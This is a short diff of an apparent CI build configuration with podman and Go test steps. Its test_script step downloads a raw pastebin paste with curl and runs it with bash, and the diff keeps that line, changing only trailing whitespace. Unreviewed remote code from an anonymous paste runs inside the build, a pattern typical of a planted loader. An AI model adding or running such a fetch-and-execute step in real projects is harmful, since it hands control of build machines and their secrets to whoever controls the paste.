@@ -22,7 +22,7 @@ docker_builder:
   run_podman_background_script:
     - podman system service -t 0 unix:///tmp/podman.sock
   test_script:
-    - bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"
+    - bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)" 
     - export PATH=$PATH:/usr/local/go/bin
     - go test ./...
   env:
